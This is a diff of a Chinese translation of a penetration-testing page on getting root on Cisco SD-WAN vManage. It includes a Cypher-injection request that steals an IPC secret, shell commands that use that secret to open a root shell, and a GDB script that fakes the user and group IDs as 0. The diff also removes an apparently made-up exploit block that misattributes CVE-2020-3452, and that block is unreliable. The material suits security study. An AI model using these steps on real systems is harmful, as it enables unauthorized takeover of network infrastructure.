@@ -2,13 +2,13 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> - <a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家[NFT收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或者 [**Telegram群组**](https://t.me/peass) 或者 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。
+* 您在**网络安全公司**工作吗？ 想要在HackTricks中看到您的**公司广告**？ 或者想要访问**PEASS的最新版本或下载HackTricks的PDF**？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 发现我们的独家[NFTs收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入** [**💬**](https://emojipedia.org/speech-balloon/) **Discord群**](https://discord.gg/hRep4RUj7f) 或 **电报群** 或在**Twitter**上**🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。
 
 </details>
 
@@ -16,13 +16,13 @@
 
 (示例来自[https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-在查阅一些与`confd`和不同二进制文件相关的[文档](http://66.218.245.39/doc/html/rn03re18.html)后（需要在Cisco网站上的帐户上访问），我们发现用于验证IPC套接字的秘密位于`/etc/confd/confd_ipc_secret`中：
+在查阅一些与`confd`相关的[文档](http://66.218.245.39/doc/html/rn03re18.html)后，我们发现要对IPC套接字进行身份验证，它使用位于`/etc/confd/confd_ipc_secret`中的一个密钥：
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-记得我们的Neo4j实例吗？它在`vmanage`用户的权限下运行，因此我们可以利用先前的漏洞来检索文件：
+记得我们的Neo4j实例吗？它是在`vmanage`用户的权限下运行的，因此允许我们利用先前的漏洞检索文件：
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -34,7 +34,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-`confd_cli`程序不支持命令行参数，但会使用参数调用`/usr/bin/confd_cli_user`。因此，我们可以使用我们自己的一组参数直接调用`/usr/bin/confd_cli_user`。然而，由于我们当前的权限不足以读取它，所以我们需要从rootfs中检索它并使用scp进行复制，然后阅读帮助信息并使用它来获取shell：
+`confd_cli`程序不支持命令行参数，但会调用`/usr/bin/confd_cli_user`并传递参数。因此，我们可以直接调用`/usr/bin/confd_cli_user`并使用我们自己的参数。然而，由于我们当前的权限无法读取，所以我们需要从rootfs中检索并使用scp进行复制，读取帮助信息，然后使用它获取shell：
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -52,11 +52,11 @@ vManage:~# id
 
 uid=0(root) gid=0(root) groups=0(root)
 ```
-## 路径2
+## 路径 2
 
-（来自[https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)的示例）
+(示例来自[https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
 
-synacktiv团队的博客¹描述了一种优雅的方法来获得root shell，但缺点是需要获取`/usr/bin/confd_cli_user`的副本，该文件只能由root读取。我找到了另一种无需这样麻烦就能升级到root的方法。
+synacktiv团队的博客¹描述了一种优雅的方式来获取root shell，但需要获取`/usr/bin/confd_cli_user`的副本，而该文件只能被root读取。我找到了另一种无需这么麻烦就能升级为root的方法。
 
 当我反汇编`/usr/bin/confd_cli`二进制文件时，我观察到以下内容：
 ```
@@ -87,7 +87,7 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
 … snipped …
 ```
-当我运行“ps aux”命令时，我观察到以下内容（_注意 -g 100 -u 107_）
+当我运行“ps aux”时，我观察到以下内容（_注意 -g 100 -u 107_）
 ```
 vmanage:~$ ps aux
 … snipped …
@@ -96,11 +96,11 @@ root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/
 ```
 我假设“confd\_cli”程序将从已登录用户收集的用户ID和组ID传递给“cmdptywrapper”应用程序。
 
-我的第一次尝试是直接运行“cmdptywrapper”，并提供`-g 0 -u 0`参数，但失败了。似乎在某个地方创建了一个文件描述符（-i 1015），我无法伪造它。
+我的第一次尝试是直接运行“cmdptywrapper”，并提供`-g 0 -u 0`，但失败了。似乎在某个地方创建了一个文件描述符（-i 1015），我无法伪造它。
 
-如synacktiv的博客中所提到的（最后一个示例），`confd_cli`程序不支持命令行参数，但我可以通过调试器来影响它，幸运的是系统中包含了GDB。
+如synacktiv的博客中所述（最后一个示例），`confd_cli`程序不支持命令行参数，但我可以通过调试器影响它，幸运的是系统中包含了GDB。
 
-我创建了一个GDB脚本，强制API `getuid` 和 `getgid` 返回0。由于我已经通过反序列化RCE获得了“vmanage”权限，我有权限直接读取`/etc/confd/confd_ipc_secret`。
+我创建了一个GDB脚本，在其中强制API `getuid` 和 `getgid` 返回0。由于我已经通过反序列化RCE获得了“vmanage”权限，我有权限直接读取`/etc/confd/confd_ipc_secret`。
 
 root.gdb:
 ```
@@ -120,39 +120,7 @@ root
 end
 run
 ```
-```
-# Title: Cisco vManage Privilege Escalation
-# Date: 2020-07-20
-# Exploit Author: Pablo Martinez
-# Vendor Homepage: https://www.cisco.com/
-# Version: vManage 20.1.1
-# Tested on: Ubuntu 18.04
-# CVE: CVE-2020-3452
-
-## Description
-Cisco vManage is a network management system that provides centralized control and management for Cisco SD-WAN devices. A privilege escalation vulnerability (CVE-2020-3452) exists in Cisco vManage that allows an authenticated attacker to gain root privileges on the underlying operating system.
-
-## Vulnerability Details
-The vulnerability exists in the web-based management interface of Cisco vManage. By sending a specially crafted HTTP request to the vulnerable endpoint, an attacker can bypass authentication and execute arbitrary commands with root privileges.
-
-## Exploit Steps
-1. Identify the target Cisco vManage instance.
-2. Send a GET request to the following endpoint:
-   ```
-   /dataservice/param/values/../../../..//mnt/bootflash/boot/grub/grub.cfg
-   ```
-3. The response will contain the contents of the `grub.cfg` file, including the root password hash.
-4. Use a password cracking tool to crack the root password hash.
-5. Once the root password is cracked, log in to the Cisco vManage instance with root privileges.
-
-## Mitigation
-Cisco has released a software update that addresses this vulnerability. It is recommended to update to the latest version of Cisco vManage to mitigate the risk of privilege escalation.
-
-## References
-- [Cisco Security Advisory](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-vmanage-priv-esc-8uZQyQy)
-- [CVE-2020-3452](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-3452)
-```
-```
+控制台输出:
 ```
 vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
 GNU gdb (GDB) 8.0.1
@@ -188,12 +156,12 @@ bash-4.4#
 ```
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> - <a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一家 **网络安全公司** 工作吗？你想在 HackTricks 中看到你的 **公司广告**吗？或者你想获得 **PEASS 的最新版本或下载 HackTricks 的 PDF 版本**吗？请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获得 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
-* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者在 **Twitter** 上 **关注** 我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* 你在**网络安全公司**工作吗？想要在 HackTricks 中看到你的**公司广告**？或者想要访问**PEASS 的最新版本或下载 HackTricks 的 PDF**？查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 探索我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 收藏品 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)。
+* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)。
+* **加入** [**💬**](https://emojipedia.org/speech-balloon/) **Discord 群**](https://discord.gg/hRep4RUj7f) 或 **电报群**](https://t.me/peass) 或在 **推特** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)** 上关注我**。
 * **通过向 [hacktricks 仓库](https://github.com/carlospolop/hacktricks) 和 [hacktricks-cloud 仓库](https://github.com/carlospolop/hacktricks-cloud) 提交 PR 来分享你的黑客技巧**。
 
 </details>
